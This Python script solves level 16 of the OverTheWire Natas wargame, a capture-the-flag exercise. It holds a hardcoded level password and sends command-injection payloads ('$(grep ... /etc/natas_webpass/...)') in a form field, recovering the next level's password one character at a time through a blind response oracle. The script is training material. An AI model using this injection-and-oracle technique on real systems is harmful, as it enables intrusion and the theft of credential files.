# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from string import ascii_letters, digits
from time import sleep

def natas16():
    username = "natas16"
    password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

    s = ascii_letters+digits
    chars = ""

    for i in s: 
        data={"needle":f"doctors$(grep {i} /etc/natas_webpass/natas17)"}
        while 1:
            try:
                content = post_page(16, username, password, data)
                break
            except:
                print("Fail to connect, wait 5 seconds and retrying...")
                sleep(5)
        if "doctors" not in content:
            chars += i
            print(chars)
        sleep(1)
    # print(chars)

    # chars = "bcdghkmnqrswAGHNPQSW035789"
    pw = ""
    
    for k in range(32):
        print(k)
        for i in chars:
            print(f"TESTING:{i}")
            p = pw+i
            data = {"needle":f"doctors$(grep ^{p} /etc/natas_webpass/natas17)"}
            
            while 1:
                try:
                    content = post_page(16, username, password, data)
                    break
                except:
                    print("Fail to connect, wait 5 seconds and retrying...")
                    sleep(5)

            if "doctors" not in content:
                pw += i
                print(f"FIND:{pw}")
                break
            sleep(1)
    print(pw)

if __name__ == "__main__":
    natas16()
